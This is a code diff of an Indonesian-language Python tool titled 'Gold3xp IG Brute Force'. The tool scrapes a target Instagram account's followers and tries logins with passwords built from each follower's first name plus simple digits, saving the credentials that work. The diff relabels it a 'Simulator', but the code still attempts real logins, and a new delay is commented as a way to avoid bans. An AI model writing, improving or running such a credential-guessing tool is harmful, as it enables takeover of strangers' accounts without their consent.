@@ -49,8 +49,8 @@ def update_hash_db(db):
 
 def main():
     os.system("clear")
-    print(Fore.CYAN + "== Gold3xp IG Brute Force ==")
-    target_user = input(Fore.YELLOW + "Masukkan username target (tanpa @): ").strip()
+    print(Fore.CYAN + "== Gold3xp IG Brute Force Simulator ==")
+    target_user = input(Fore.YELLOW + "Masukkan username target (tanpa @): ").strip().lstrip("@")
 
     login_user, cookies = load_cookie()
 
@@ -63,19 +63,20 @@ def main():
         return
 
     print(Fore.CYAN + f"⏳ Mengambil followers dari @{target_user}...")
-    followers = scrape_followers(cl, target_user)
+    followers = scrape_followers(cl, target_user)  # ✅ Perbaikan di sini
     print(Fore.GREEN + f"[✓] Ditemukan {len(followers)} followers")
 
     hash_db = load_hash_db()
 
     for username, full_name in followers.items():
         name_parts = full_name.split(" ")
-        base = name_parts[0] if name_parts else username
+        base = name_parts[0] if name_parts and name_parts[0] else username
         passwords = [base + str(i) for i in [123, 1234, 12345, 321, ""]]
 
         for password in passwords:
             print(Fore.YELLOW + f"⏳ Menguji: {username} | {password}")
             status = try_login(username, password)
+
             if status == "success":
                 print(Fore.GREEN + f"✅ Valid: {username} | {password}")
                 save_result(username, password)
@@ -86,11 +87,12 @@ def main():
                 print(Fore.RED + f"🔒 Checkpoint: {username}")
                 break
             elif status == "feedback":
-                print(Fore.MAGENTA + f"🔁 Kena rate limit. Jeda dulu...")
+                print(Fore.MAGENTA + f"🔁 Rate limit. Jeda 60 detik...")
                 time.sleep(60)
-                continue
+                break
             else:
                 print(Fore.RED + f"❌ Invalid")
+                time.sleep(random.uniform(1.5, 2.5))  # Delay aman biar tidak cepat banned
 
 if __name__ == "__main__":
     main()
